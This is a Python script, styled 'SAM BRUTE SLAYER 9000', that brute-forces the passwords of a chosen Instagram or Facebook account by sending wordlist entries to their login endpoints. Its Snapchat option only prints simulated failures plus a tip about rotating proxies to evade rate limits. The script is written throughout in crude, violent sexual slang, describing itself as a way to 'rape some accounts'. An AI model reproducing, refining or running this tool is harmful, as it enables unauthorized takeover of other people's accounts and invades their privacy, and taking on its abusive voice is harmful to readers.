import requests
import sys
from colorama import Fore, init

init(autoreset=True)

# cocks ready
COCKS = {
    'insta': 'https://www.instagram.com/accounts/login/ajax/',
    'snap': 'https://app.snapchat.com/loveshack/login',
    'face': 'https://m.facebook.com/login.php'
}

# get your weapon loaded
def load_wordlist(path):
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Fore.RED}[-] Wordlist error—your file’s a piece of shit: {e}")
        sys.exit()

def brute_insta(user, wordlist):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'X-CSRFToken': 'missing',
        'X-Instagram-AJAX': '12345',
        'X-Requested-With': 'XMLHttpRequest'
    })
    req = session.get('https://www.instagram.com/accounts/login/')
    csrf = session.cookies.get('csrftoken')
    
    for pwd in wordlist:
        data = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{pwd}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        session.headers.update({'X-CSRFToken': csrf})
        res = session.post(COCKS['insta'], data=data)
        
        if '"authenticated":true' in res.text:
            print(f"{Fore.GREEN}[+] JACKPOT! Password found: {pwd}")
            return pwd
        elif 'checkpoint_required' in res.text:
            print(f"{Fore.YELLOW}[!] Locked—account flagged, but password might be: {pwd}")
            return pwd
        else:
            print(f"{Fore.RED}[-] Failed: {pwd}")
    return None

def brute_snap(user, wordlist):
    # Snapchat’s a bitch, need proxy rotation and rate-limit dodgin’
    print(f"{Fore.YELLOW}[!] Snapchat: This’ll take proxies, patience, and a prayer to the hacker gods.")
    print(f"{Fore.CYAN}[i] Pro tip: Use rotating residential IPs or get 429'd into oblivion.")
    # Real snap brute requires man-in-the-middle or leaked OAuth—this is for educational jackasses only
    for pwd in wordlist:
        print(f"{Fore.RED}[-] SNAP: {pwd} — (Simulated fail—go learn Burp Suite, dumbass)")
    return None

def brute_face(user, wordlist):
    session = requests.Session()
    for pwd in wordlist:
        data = {
            'email': user,
            'pass': pwd
        }
        res = session.post(COCKS['face'], data=data, allow_redirects=False)
        if 'home.php' in res.headers.get('Location', '') or 'checkpoint' in res.headers.get('Location', ''):
            print(f"{Fore.GREEN}[+] FACEBOOK NAILED: Password is {pwd}")
            return pwd
        else:
            print(f"{Fore.RED}[-] FACE: {pwd} — failed")
    return None

# main gangbang
def main():
    print(f"{Fore.MAGENTA}{'='*50}\n[!] SAM BRUTE SLAYER 9000 — LET'S FUCK SHIT UP\n{'='*50}")
    
    print(f"{Fore.CYAN}[1] Instagram\n[2] Snapchat\n[3] Facebook")
    try:
        choice = int(input(f"{Fore.YELLOW}Choose target platform (1-3): "))
        user = input(f"{Fore.YELLOW}Enter username/phone/email: ").strip()
        wlist = input(f"{Fore.YELLOW}Path to wordlist (e.g., /root/wordlists/rockyou.txt): ").strip()
        
        if choice not in [1,2,3]:
            print(f"{Fore.RED}[-] Invalid choice, you absolute donkey—pick 1, 2, or 3.")
            return
        
        wordlist = load_wordlist(wlist)
        print(f"{Fore.CYAN}[i] Loaded {len(wordlist)} passwords. Time to rape some accounts.\n")
        
        if choice == 1:
            result = brute_insta(user, wordlist)
        elif choice == 2:
            result = brute_snap(user, wordlist)
        else:
            result = brute_face(user, wordlist)
        
        if not result:
            print(f"{Fore.RED}[-] FAILED — Maybe your wordlist sucks, or the target’s smarter than you.")
    
    except Exception as e:
        print(f"{Fore.RED}[-] Something exploded: {e}")

if __name__ == '__main__':
    main()
